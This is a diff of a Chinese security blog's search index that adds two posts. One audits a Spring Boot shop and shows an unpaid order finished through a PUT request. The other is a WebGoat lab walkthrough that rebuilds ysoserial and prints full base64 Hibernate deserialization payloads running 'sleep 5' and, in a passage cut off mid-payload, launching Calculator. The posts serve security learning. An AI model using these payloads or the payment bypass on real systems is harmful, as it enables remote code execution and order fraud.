@@ -884,6 +897,32 @@
 ]]></content>
   </entry>
   <entry>
+    <title>Java SpringBoot框架代码审计七 - 逻辑漏洞</title>
+    <url>/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/</url>
+    <content><![CDATA[<p>逻辑漏洞不像之前介绍的漏洞有一套固定的审计流程，每个逻辑漏洞背后的代码都不一样。通过纯白盒去找逻辑漏洞是比较费劲的，首先需要彻底了解业务，再带着各种疑问和奇怪的想法去审。</p>
+<a id="more"></a>
+
+<h1 id="逻辑漏洞代码审计过程"><a href="#逻辑漏洞代码审计过程" class="headerlink" title="逻辑漏洞代码审计过程"></a>逻辑漏洞代码审计过程</h1><p>用户正常的购物过程是<code>添加购物车-&gt;下单-&gt;付款-&gt;出库-&gt;交易成功</code>，但程序在购物过程中没有对前一步进行校验。下订单但未支付时，访问<code>/orders/{orderNo}/finish</code>可直接完成交易。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// /src/main/java/ltd/newbee/mall/controller/mall/OrderController.java</span></span><br><span class="line"><span class="meta">@PutMapping</span>(<span class="string">"/orders/&#123;orderNo&#125;/finish"</span>)</span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Result <span class="title">finishOrder</span><span class="params">(@PathVariable(<span class="string">"orderNo"</span>)</span> String orderNo, HttpSession httpSession) </span>&#123;</span><br><span class="line">    NewBeeMallUserVO user = (NewBeeMallUserVO) httpSession.getAttribute(Constants.MALL_USER_SESSION_KEY);</span><br><span class="line">    String finishOrderResult = newBeeMallOrderService.finishOrder(orderNo, user.getUserId());</span><br><span class="line">    <span class="keyword">if</span> (ServiceResultEnum.SUCCESS.getResult().equals(finishOrderResult)) &#123;</span><br><span class="line">        <span class="keyword">return</span> ResultGenerator.genSuccessResult();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ResultGenerator.genFailResult(finishOrderResult);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>从代码中可以看到直接调用<code>newBeeMallOrderService.finishOrder(orderNo, user.getUserId())</code>，对于该订单是否支付，是否出库等过程都没有校验。</p>
+<h1 id="实际测试"><a href="#实际测试" class="headerlink" title="实际测试"></a>实际测试</h1><p>随便添加一件物品到购物车，提交订单</p>
+<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/submit-order.png" alt="submit-order"></p>
+<p>此时来到订单详情页面，按正常逻辑来下一步是付款操作</p>
+<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/pay-order.png" alt="pay-order"></p>
+<p>在管理页面确认该订单当前状态是待支付</p>
+<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/wait-for-payment.png" alt="wait-for-payment"></p>
+<p>使用PUT方法访问<code>http://localhost:8089/orders/15886680589866584/finish</code>即可直接完成订单</p>
+<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/bypass-pay-order.png" alt="bypass-pay-order"></p>
+<p>因为代码使用的是<code>@PutMapping</code>，所以只能使用PUT方法访问，其他请求方法不会被执行</p>
+<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/finishOrder.png" alt="finishOrder"></p>
+<p>再次查看订单，已经交易成功</p>
+<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/paid-success.png" alt="paid-success"></p>
+<p>在管理页面查看该订单，证明交易成功。</p>
+<p><img src="/2020/05/06/JavaSpringBootCodeAudit-7-Logical-Vulnerability/show-orders.png" alt="show-orders"></p>
+]]></content>
+  </entry>
+  <entry>
     <title>Tomcat 8.5版本以上隐藏400报错信息</title>
     <url>/2019/12/26/Tomcat8.5+_400_hide/</url>
     <content><![CDATA[<p>一个平时没注意过的问题。</p>
@@ -930,6 +969,77 @@
 <p><code>cd /usr/local/soft/tomcat/</code>就到了tomcat目录，其中<code>conf</code>目录就是配置文件所在的目录，需要更改的<code>server.xml</code>就在该路径下</p>
 <p><img src="/2019/12/26/Tomcat8.5+_400_hide/tomcat-conf-path.png" alt="tomcat-conf-path"></p>
 ]]></content>
+  </entry>
+  <entry>
+    <title>WebGoat - 不安全的反序列化</title>
+    <url>/2019/09/28/WebGoat-Deserialization/</url>
+    <content><![CDATA[<p>Webgoat有一道不安全反序列化的题，如下：</p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/webgoat-insecure-deserialization.png" alt="webgoat-insecure-deserialization.png"></p>
+<p>最初看到这题有点迷茫，不知道该怎么下手，正是迷茫才能从中学到反序列。从网上找了一些文章，自己也动手完全整了一遍，在此记录。<a id="more"></a>（网上特别详细的文章也没有，所以很多坑都是一步一个脚印踩上去的）</p>
+<p>最早的一篇讲解Webgoat反序列化的文章</p>
+<p><a href="https://medium.com/abn-amro-red-team/java-deserialization-from-discovery-to-reverse-shell-on-limited-environments-2e7b4e14fbef" target="_blank" rel="noopener">https://medium.com/abn-amro-red-team/java-deserialization-from-discovery-to-reverse-shell-on-limited-environments-2e7b4e14fbef</a></p>
+<p>上一篇文章的中文翻译，其中有部分作者的改动</p>
+<p><a href="https://blog.spoock.com/2018/10/31/reverse-shell-on-limited-environments/" target="_blank" rel="noopener">https://blog.spoock.com/2018/10/31/reverse-shell-on-limited-environments/</a></p>
+<p>另一篇文章</p>
+<p><a href="https://www.jianshu.com/p/0c45058e1723" target="_blank" rel="noopener">https://www.jianshu.com/p/0c45058e1723</a></p>
+<h2 id="正文开始"><a href="#正文开始" class="headerlink" title="正文开始"></a>正文开始</h2><p>安装Burp插件Java Deserialization Scanner，被动扫描发现存在不安全反序列化漏洞</p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-detect.png" alt="deserialization-detect"></p>
+<p>将请求Send request to DS - Manual testing 进行测试，发现存在Hibernate 5类型的反序列化</p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-manual-testing.png" alt="deserialization-manual-testing"></p>
+<p>然后将请求Send request to DS - Exploitation</p>
+<p>坑点一：使用原始的ysoserial.jar执行会报错，需要重新编译ysoserial</p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-exploiting.png" alt="deserialization-exploiting"></p>
+<p>详细报错信息如下所示</p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-error.png" alt="deserialization-error"></p>
+<p>在GitHub项目里下载源码，无需修改（因为源码里面已经添加了，但是作者并没有将它打包放在releases里）。GitHub地址：<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a></p>
+<p><code>mvn clean package -DskipTests -Dhibernate5</code>即可构建代码（亲测不加-Dhibernate5不行)</p>
+<p>在插件中配置好构建完成的jar包路径，即可正常执行反序列化payload。</p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-exploiting-2.png" alt="deserialization-exploiting-2"></p>
+<p>坑点二：Mac下该Java 版本执行ysoserial.jar会提示</p>
+<blockquote>
+<p>com.nqzero.permit.Permit$InitializationFailed: initialization failed, perhaps you’re running with a security manager</p>
+</blockquote>
+<p><img src="/2019/09/28/WebGoat-Deserialization/java-version.png" alt="java-version"></p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/ysoserial-hibernate-error.png" alt="ysoserial-hibernate-error"></p>
+<p>需要在pom.xml中将nqzero版本改为0.4（原始为0.3），重新使用maven构建即可使用。</p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/nqzero.png" alt="nqzero.png"></p>
+<p>最开始碰到这个问题还以为在Mac下或者是Java版本太高不能用了，于是在Windows下执行，但是Windows执行后不能立马进行base64，还需要将ysoserial的输出保存在文件中，再将文件内容base64编码，觉得太麻烦。这个问题在谷歌中查也查不到解决办法。</p>
+<p>在IntelliJ IDEA中查看pom.xml文件时发现存在com.nqzero这个包，报错信息也是com.nqzero.permit.Permit$InitializationFailed，于是想着会不会是这个包版本不对，在maven库中一查，果然最新是0.4版本的，于是换成0.4后使用maven构建后可正常使用。</p>
+<p>构建时发现Java版本为1.6，我的maven没法构建，将Java版本改为1.7或者1.8即可正常构建。</p>
+<p>坑点三：在Linux中，ysoserial的反序列化无法使用sleep命令，其他命令能执行，这不知道为什么，但是在其他人文章中发现windows下的sleep能执行。目前没有发现任何解决办法，这个稍后动态调试一下看看到底是什么问题导致的。</p>
+<p><em>PS：但是Deserialization Scanner中的payload是sleep十秒的，目前不清楚是怎么实现的。</em></p>
+<p><strong>请求在执行sleep后并未等待命令结束就已经返回结果</strong>，若要等待进程结束后返回，需要针对ysoserial的执行命令进行调整，重新生成payload进行测试。</p>
+<p>在ysoserial/payloads/util/Gadgets.java:117-119，将代码做以下修改，可实现sleep等待5秒</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">String cmd = <span class="string">"java.lang.Process p=java.lang.Runtime.getRuntime().exec(\\"</span><span class="string">" +</span></span><br><span class="line"><span class="string">            command.replaceAll("</span>\\\\\\\\",<span class="string">"\\\\\\\\\\\\\\\\"</span>).replaceAll(<span class="string">"\\"</span><span class="string">", "</span>\\\\\\"<span class="string">") +</span></span><br><span class="line"><span class="string">            "</span>\\");p.waitFor();<span class="string">";</span></span><br></pre></td></tr></table></figure>
+
+<p>最终效果图如下：</p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/deserialization-exploiting-success.png" alt="deserialization-exploiting-success"></p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/webgoat-insecure-deserialization-complete.png" alt="webgoat-insecure-deserialization-complete"></p>
+<p>payload也贴一下吧</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAI29yZy5oaWJlcm5hdGUuZW5naW5lLnNwaS5UeXBlZFZhbHVlh4gUshmh5zwCAAJMAAR0eXBldAAZTG9yZy9oaWJlcm5hdGUvdHlwZS9UeXBlO0wABXZhbHVldAASTGphdmEvbGFuZy9PYmplY3Q7eHBzcgAgb3JnLmhpYmVybmF0ZS50eXBlLkNvbXBvbmVudFR5cGV-e2Nh9AnXEQIADVoAEmhhc05vdE51bGxQcm9wZXJ0eVoABWlzS2V5SQAMcHJvcGVydHlTcGFuTAAPY2FuRG9FeHRyYWN0aW9udAATTGphdmEvbGFuZy9Cb29sZWFuO1sAB2Nhc2NhZGV0AChbTG9yZy9oaWJlcm5hdGUvZW5naW5lL3NwaS9DYXNjYWRlU3R5bGU7TAARY29tcG9uZW50VHVwbGl6ZXJ0ADFMb3JnL2hpYmVybmF0ZS90dXBsZS9jb21wb25lbnQvQ29tcG9uZW50VHVwbGl6ZXI7TAAKZW50aXR5TW9kZXQAGkxvcmcvaGliZXJuYXRlL0VudGl0eU1vZGU7WwALam9pbmVkRmV0Y2h0ABpbTG9yZy9oaWJlcm5hdGUvRmV0Y2hNb2RlO1sADXByb3BlcnR5TmFtZXN0ABNbTGphdmEvbGFuZy9TdHJpbmc7WwATcHJvcGVydHlOdWxsYWJpbGl0eXQAAltaWwANcHJvcGVydHlUeXBlc3QAGltMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGU7WwAhcHJvcGVydHlWYWx1ZUdlbmVyYXRpb25TdHJhdGVnaWVzdAAmW0xvcmcvaGliZXJuYXRlL3R1cGxlL1ZhbHVlR2VuZXJhdGlvbjtMAAl0eXBlU2NvcGV0ACpMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGVGYWN0b3J5JFR5cGVTY29wZTt4cgAfb3JnLmhpYmVybmF0ZS50eXBlLkFic3RyYWN0VHlwZYdFsKQmRS24AgAAeHAAAAAAAAFwcHNyADNvcmcuaGliZXJuYXRlLnR1cGxlLmNvbXBvbmVudC5Qb2pvQ29tcG9uZW50VHVwbGl6ZXLAqqGhlZ9DmwIABEwADmNvbXBvbmVudENsYXNzdAARTGphdmEvbGFuZy9DbGFzcztMAAlvcHRpbWl6ZXJ0ADBMb3JnL2hpYmVybmF0ZS9ieXRlY29kZS9zcGkvUmVmbGVjdGlvbk9wdGltaXplcjtMAAxwYXJlbnRHZXR0ZXJ0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxwYXJlbnRTZXR0ZXJ0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL1NldHRlcjt4cgA3b3JnLmhpYmVybmF0ZS50dXBsZS5jb21wb25lbnQuQWJzdHJhY3RDb21wb25lbnRUdXBsaXplcgh6nmX_Q4R7AgAFWgASaGFzQ3VzdG9tQWNjZXNzb3JzSQAMcHJvcGVydHlTcGFuWwAHZ2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxpbnN0YW50aWF0b3J0ACJMb3JnL2hpYmVybmF0ZS90dXBsZS9JbnN0YW50aWF0b3I7WwAHc2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL1NldHRlcjt4cAAAAAAAdXIAK1tMb3JnLmhpYmVybmF0ZS5wcm9wZXJ0eS5hY2Nlc3Muc3BpLkdldHRlcjsmhfgDST23zwIAAHhwAAAAAXNyAD1vcmcuaGliZXJuYXRlLnByb3BlcnR5LmFjY2Vzcy5zcGkuR2V0dGVyTWV0aG9kSW1wbCRTZXJpYWxGb3JtrFu2VsndG1gCAARMAA5jb250YWluZXJDbGFzc3EAfgAUTAAOZGVjbGFyaW5nQ2xhc3NxAH4AFEwACm1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMAAxwcm9wZXJ0eU5hbWVxAH4AIHhwdnIAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0_BbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXEAfgAgTAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHBxAH4AJnQAE2dldE91dHB1dFByb3BlcnRpZXN0AAR0ZXN0cHBwcHBwcHBwcHVyABpbTG9yZy5oaWJlcm5hdGUudHlwZS5UeXBlO36vq6HklWGaAgAAeHAAAAABcQB-ABJwcHNxAH4AIgAAAAD_____dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX-AYIVOACAAB4cAAABtPK_rq-AAAANAA_CgACAAMHAAQMAAUABgEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBAAY8aW5pdD4BAAMoKVYHAD0BADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQHAAoBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQWtIJPzkd3vPgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAHQEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQEADElubmVyQ2xhc3NlcwcAJwEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQAHc2xlZXAgNQgAMAEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMADIAMwoAKwA0AQARamF2YS9sYW5nL1Byb2Nlc3MHADYBAAd3YWl0Rm9yAQADKClJDAA4ADkKADcAOgEADVN0YWNrTWFwVGFibGUBAB55c29zZXJpYWwvUHduZXIxMzkwODU2MDU4NzM2MTYBACBMeXNvc2VyaWFsL1B3bmVyMTM5MDg1NjA1ODczNjE2OwAhAAcAAgABAAkAAQAaAAsADAABAA0AAAACAA4ABAABAAUABgABABAAAAAvAAEAAQAAAAUqtwABsQAAAAIAEQAAAAYAAQAAAC8AEgAAAAwAAQAAAAUAEwA-AAAAAQAVABYAAgAQAAAAPwAAAAMAAAABsQAAAAIAEQAAAAYAAQAAADQAEgAAACAAAwAAAAEAEwA-AAAAAAABABcAGAABAAAAAQAZABoAAgAbAAAABAABABwAAQAVAB4AAgAQAAAASQAAAAQAAAABsQAAAAIAEQAAAAYAAQAAADgAEgAAACoABAAAAAEAEwA-AAAAAAABABcAGAABAAAAAQAfACAAAgAAAAEAIQAiAAMAGwAAAAQAAQAcAAgAKQAGAAEAEAAAACkAAwADAAAAFKcAAwFMuAAvEjG2ADVNLLYAO1exAAAAAQA8AAAAAwABAwACACMAAAACACQAJQAAAAoAAQAHACYAKAAJdXEAfgAuAAAB1Mr-ur4AAAA0ABsKAAIAAwcABAwABQAGAQAQamF2YS9sYW5nL09iamVjdAEABjxpbml0PgEAAygpVgcACAEAI3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vBwAKAQAUamF2YS9pby9TZXJpYWxpemFibGUBABBzZXJpYWxWZXJzaW9uVUlEAQABSgEADUNvbnN0YW50VmFsdWUFceZp7jxtRxgBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAJUx5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJEZvbzsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhAQAMSW5uZXJDbGFzc2VzBwAZAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEAA0ZvbwAhAAcAAgABAAkAAQAaAAsADAABAA0AAAACAA4AAQABAAUABgABABAAAAAvAAEAAQAAAAUqtwABsQAAAAIAEQAAAAYAAQAAADwAEgAAAAwAAQAAAAUAEwAUAAAAAgAVAAAAAgAWABcAAAAKAAEABwAYABoACXB0AARQd25ycHcBAHhxAH4ABXNxAH4AAnEAfgAScQB-ACtxAH4AMng</span><br></pre></td></tr></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>关键就两点：</p>
+<ol>
+<li>识别反序列化流量</li>
+<li>找到相应可利用执行命令的组件</li>
+</ol>
+<p>有时候需要特别修改ysoserial的内容来配合执行命令。</p>
+<h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>可在<code>/WebGoat-develop/webgoat-container/src/main/resources/application.properties:6</code> 修改端口等信息</p>
+<p><img src="/2019/09/28/WebGoat-Deserialization/application-properties.png" alt="application-properties"></p>
+<p>更改反序列化payload为弹计算器，反序列化payload如下：</p>
+<p>（Mac下计算器路径是<code>/Applications/Calculator.app/Contents/MacOS/Calculator</code>）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAI29yZy5oaWJlcm5hdGUuZW5naW5lLnNwaS5UeXBlZFZhbHVlh4gUshmh5zwCAAJMAAR0eXBldAAZTG9yZy9oaWJlcm5hdGUvdHlwZS9UeXBlO0wABXZhbHVldAASTGphdmEvbGFuZy9PYmplY3Q7eHBzcgAgb3JnLmhpYmVybmF0ZS50eXBlLkNvbXBvbmVudFR5cGV-e2Nh9AnXEQIADVoAEmhhc05vdE51bGxQcm9wZXJ0eVoABWlzS2V5SQAMcHJvcGVydHlTcGFuTAAPY2FuRG9FeHRyYWN0aW9udAATTGphdmEvbGFuZy9Cb29sZWFuO1sAB2Nhc2NhZGV0AChbTG9yZy9oaWJlcm5hdGUvZW5naW5lL3NwaS9DYXNjYWRlU3R5bGU7TAARY29tcG9uZW50VHVwbGl6ZXJ0ADFMb3JnL2hpYmVybmF0ZS90dXBsZS9jb21wb25lbnQvQ29tcG9uZW50VHVwbGl6ZXI7TAAKZW50aXR5TW9kZXQAGkxvcmcvaGliZXJuYXRlL0VudGl0eU1vZGU7WwALam9pbmVkRmV0Y2h0ABpbTG9yZy9oaWJlcm5hdGUvRmV0Y2hNb2RlO1sADXByb3BlcnR5TmFtZXN0ABNbTGphdmEvbGFuZy9TdHJpbmc7WwATcHJvcGVydHlOdWxsYWJpbGl0eXQAAltaWwANcHJvcGVydHlUeXBlc3QAGltMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGU7WwAhcHJvcGVydHlWYWx1ZUdlbmVyYXRpb25TdHJhdGVnaWVzdAAmW0xvcmcvaGliZXJuYXRlL3R1cGxlL1ZhbHVlR2VuZXJhdGlvbjtMAAl0eXBlU2NvcGV0ACpMb3JnL2hpYmVybmF0ZS90eXBlL1R5cGVGYWN0b3J5JFR5cGVTY29wZTt4cgAfb3JnLmhpYmVybmF0ZS50eXBlLkFic3RyYWN0VHlwZYdFsKQmRS24AgAAeHAAAAAAAAFwcHNyADNvcmcuaGliZXJuYXRlLnR1cGxlLmNvbXBvbmVudC5Qb2pvQ29tcG9uZW50VHVwbGl6ZXLAqqGhlZ9DmwIABEwADmNvbXBvbmVudENsYXNzdAARTGphdmEvbGFuZy9DbGFzcztMAAlvcHRpbWl6ZXJ0ADBMb3JnL2hpYmVybmF0ZS9ieXRlY29kZS9zcGkvUmVmbGVjdGlvbk9wdGltaXplcjtMAAxwYXJlbnRHZXR0ZXJ0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxwYXJlbnRTZXR0ZXJ0ACpMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL1NldHRlcjt4cgA3b3JnLmhpYmVybmF0ZS50dXBsZS5jb21wb25lbnQuQWJzdHJhY3RDb21wb25lbnRUdXBsaXplcgh6nmX_Q4R7AgAFWgASaGFzQ3VzdG9tQWNjZXNzb3JzSQAMcHJvcGVydHlTcGFuWwAHZ2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL0dldHRlcjtMAAxpbnN0YW50aWF0b3J0ACJMb3JnL2hpYmVybmF0ZS90dXBsZS9JbnN0YW50aWF0b3I7WwAHc2V0dGVyc3QAK1tMb3JnL2hpYmVybmF0ZS9wcm9wZXJ0eS9hY2Nlc3Mvc3BpL1NldHRlcjt4cAAAAAAAdXIAK1tMb3JnLmhpYmVybmF0ZS5wcm9wZXJ0eS5hY2Nlc3Muc3BpLkdldHRlcjsmhfgDST23zwIAAHhwAAAAAXNyAD1vcmcuaGliZXJuYXRlLnByb3BlcnR5LmFjY2Vzcy5zcGkuR2V0dGVyTWV0aG9kSW1wbCRTZXJpYWxGb3JtrFu2VsndG1gCAARMAA5jb250YWluZXJDbGFzc3EAfgAUTAAOZGVjbGFyaW5nQ2xhc3NxAH4AFEwACm1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMAAxwcm9wZXJ0eU5hbWVxAH4AIHhwdnIAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0_BbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXEAfgAgTAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHBxAH4AJnQAE2dldE91dHB1dFByb3BlcnRpZXN0AAR0ZXN0cHBwcHBwcHBwcHVyABpbTG9yZy5oaWJlcm5hdGUudHlwZS5UeXBlO36vq6HklWGaAgAAeHAAAAABcQB-ABJwcHNxAH4AIgAAAAD_____dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX-AYIVOACAAB4cAAABwDK_rq-AAAANAA_CgACAAMHAAQMAAUABgEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBAAY8aW5pdD4BAAMoKVYHAD0BADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQHAAoBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQWtIJPzkd3vPgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAHQEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQEADElubmVyQ2xhc3NlcwcAJwEAH3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQA2L0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcC9Db250ZW50cy9NYWNPUy9DYWxjdWxhdG9yCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArAD